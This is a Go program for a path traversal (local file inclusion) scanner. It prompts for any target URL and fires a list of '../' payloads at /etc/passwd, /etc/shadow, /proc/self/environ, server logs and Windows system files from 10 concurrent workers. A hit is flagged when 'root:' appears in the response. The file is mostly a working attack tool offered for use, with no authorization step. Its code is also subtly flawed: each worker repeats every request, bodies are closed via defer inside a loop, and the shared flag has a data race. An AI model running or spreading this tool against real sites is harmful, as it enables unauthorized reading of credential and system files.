package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"sync"
)

// PayloadGenerator generates LFI payloads
type PayloadGenerator interface {
	Generate() []string
}

// DefaultPayloadGenerator generates default LFI payloads
type DefaultPayloadGenerator struct{}

// Generate generates default LFI payloads
func (d DefaultPayloadGenerator) Generate() []string {
	return []string{
		"../../../../../../../../../../../../../../etc/passwd",
		"../../../../../../../../../../../../../../etc/hosts",
		"../../../../../../../../../../../../../../etc/shadow",
		"../../../../../../../../../../../../../../proc/self/environ",
		"../../../../../../../../../../../../../../var/log/auth.log",
		"../../../../../../../../../../../../../../windows/win.ini",
		"../../../../../../../../../../../../../../boot.ini",
		"../../../../../../../../../../../../../../windows/system32/drivers/etc/hosts",
		"../../../../../../../../../../../../../../usr/local/apache2/conf/httpd.conf",
		"../../../../../../../../../../../../../../var/log/apache/access.log",
		"../../../../../../../../../../../../../../var/log/apache/error.log",
		"../../../../../../../../../../../../../../var/log/httpd/access_log",
		"../../../../../../../../../../../../../../var/log/httpd/error_log",
		"../../../../../../../../../../../../../../etc/httpd/logs/access_log",
		"../../../../../../../../../../../../../../etc/httpd/logs/error_log",
		// Add more payloads here...
	}
}

func main() {
	// Prompt the user to enter the target website URL
	fmt.Print("Enter your target website URL: ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	targetURL := scanner.Text()

	// Initialize payload generator
	payloadGenerator := DefaultPayloadGenerator{}

	// Channel to communicate results
	results := make(chan string)

	// WaitGroup to wait for all workers to finish
	var wg sync.WaitGroup

	// Number of concurrent workers
	numWorkers := 10

	// Vulnerability status flag
	isVulnerable := false

	// Start the workers
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for _, payload := range payloadGenerator.Generate() {
				// Construct the URL with the payload
				testURL := fmt.Sprintf("%s/%s", targetURL, payload)

				// Perform a GET request to the URL
				resp, err := http.Get(testURL)
				if err != nil {
					fmt.Printf("Error occurred for %s: %v\n", testURL, err)
					continue
				}
				defer resp.Body.Close()

				// Read response body
				bodyBytes, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Printf("Error reading response body for %s: %v\n", testURL, err)
					continue
				}
				bodyString := string(bodyBytes)

				// Check if the response status code indicates success (200)
				if resp.StatusCode == http.StatusOK {
					// Analyze response for potential vulnerability indicators
					if strings.Contains(bodyString, "root:") {
						isVulnerable = true
						results <- fmt.Sprintf("Vulnerable URL found: %s", testURL)
					}
				}
			}
		}()
	}

	// Close the results channel once all workers are done
	go func() {
		wg.Wait()
		close(results)
	}()

	// Listen for results
	for result := range results {
		fmt.Println(result)
	}

	// Display confirmation message based on vulnerability status
	if isVulnerable {
		fmt.Println("The target is vulnerable to LFI.")
	} else {
		fmt.Println("The target is not vulnerable to LFI.")
	}

	fmt.Println("Finished testing.")
}
